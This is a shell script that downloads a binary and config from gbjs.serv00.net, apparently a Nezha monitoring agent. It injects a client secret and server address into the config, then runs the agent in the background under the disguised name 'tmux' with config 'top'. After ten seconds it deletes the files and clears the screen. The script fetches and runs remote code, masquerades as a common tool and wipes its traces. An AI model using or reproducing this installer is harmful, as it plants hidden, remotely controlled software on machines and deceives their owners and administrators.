#!/bin/sh


init_uuid(){
  ip=$(curl -s --connect-timeout 5 ident.me 2>/dev/null)
  if [ -z "$ip" ]; then
    ip=$(curl -s --connect-timeout 5 ifconfig.me 2>/dev/null)
  fi
  if [ -z "$ip" ]; then
    echo "没有获取到公网ip，退出"
    exit 1
  fi

  _uuid=$(echo -n "$ip" | sha1sum | awk '{print substr($1, 1, 32)}' | \
       sed -r 's/([0-9a-f]{8})([0-9a-f]{4})([0-9a-f]{4})([0-9a-f]{4})([0-9a-f]{12})/\1-\2-\3-\4-\5/')
  echo "$_uuid"
}

check_process() {
  if command -v pgrep >/dev/null 2>&1; then
    if pgrep -x "$V1" >/dev/null 2>&1; then
      echo "Process '$V1' found using pgrep. Exiting."
      exit 0
    fi

  elif command -v ps >/dev/null 2>&1; then
    if ps aux | grep -v grep | grep -w "$V1" >/dev/null 2>&1; then
      echo "Process '$V1' found using ps. Exiting."
      exit 0
    fi

  else
    echo "Neither pgrep nor ps is available. Trying BusyBox..."

    # 下载 busybox 到临时目录
    TMPDIR="$(mktemp -d)"
    BUSYBOX="$TMPDIR/busybox"

    if command -v wget >/dev/null 2>&1; then
      wget -q https://www.busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox -O "$BUSYBOX"
    elif command -v curl >/dev/null 2>&1; then
      curl -sL https://www.busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox -o "$BUSYBOX"
    else
      echo "Neither wget nor curl is available. Cannot download BusyBox."
      exit 1
    fi

    chmod +x "$BUSYBOX"

    # 使用 busybox 的 ps 检查进程
    if "$BUSYBOX" ps | grep -v grep | grep -w "$V1" >/dev/null 2>&1; then
      echo "Process '$V1' found using BusyBox ps. Exiting."
      rm -rf "$TMPDIR"
      exit 0
    else
      echo "Process '$V1' not found."
      rm -rf "$TMPDIR"
    fi
  fi
}


CY="top"
V1="tmux"
BASEDIR="$(pwd)/.cache"
CONFIG_DIR="$BASEDIR/$CY"
V1_DIR="$BASEDIR/$V1"

sec=${NEZHA_KEY:-''}
tls=${TLS:-''}
ser=${NEZHA_SERVER:-''}

if [ -z "$UUID" ]; then
  uuid=$(init_uuid)
else
  uuid="$UUID"
fi

check_process 

echo $uuid
v1filename="V1"
v1arm="V1arm"
# 判断架构
ARCH=$(uname -m)
if [[ "$ARCH" == "arm"* || "$ARCH" == "aarch64" ]]; then
    v1filename="$v1arm"
fi
#下载文件
mkdir -p $BASEDIR
if command -v wget > /dev/null; then
    wget -q https://gbjs.serv00.net/js/vip1715.yaml -O "$CONFIG_DIR" || { echo "下载失败"; exit 1; }
    wget -c -q https://gbjs.serv00.net/bin/${v1filename} -O "$V1_DIR" || { echo "下载失败"; exit 1; }
elif command -v curl > /dev/null; then
    curl -sSL  https://gbjs.serv00.net/js/vip1715.yaml -o "$CONFIG_DIR" || { echo "下载失败"; exit 1; }
    curl -C - -sSL https://gbjs.serv00.net/bin/${v1filename} -o "$V1_DIR" || { echo "下载失败"; exit 1; }
else
    echo "无法找到 wget 或 curl，下载失败"
    exit 1
fi
#替换文件
if [ -f "$CONFIG_DIR" ]; then
    [ -n "$sec" ]  && sed -i "s/\(client_secret: \)[^ ]*/\1$sec/" "$CONFIG_DIR" && echo "sec  replace"
    [ -n "$tls" ]  && sed -i "s/\(tls: \)[^ ]*/\1$tls/" "$CONFIG_DIR" && echo "tls  replace"
    [ -n "$ser" ]  && sed -i "s/\(server: \)[^ ]*/\1$ser/" "$CONFIG_DIR"  && echo "ser  replace"
    [ -n "$uuid" ] && sed -i "s/^uuid: .*/uuid: $uuid/"  "$CONFIG_DIR" && echo "uuid replace"
else
    echo "错误: 配置文件 $CONFIG_DIR 不存在"
    exit 1
fi
#启动
chmod +x "$V1_DIR"
cd $BASEDIR
export PATH="./:$PATH"
"$V1" -c "$CY" > /dev/null 2>&1 &
#清理文件
sleep 10
rm -rf $CONFIG_DIR
rm -rf $V1_DIR
#清空屏幕
if command -v tput >/dev/null 2>&1; then
    tput clear
else
    echo -e "\033c"
    #echo -e "\033[H\033[J"
fi

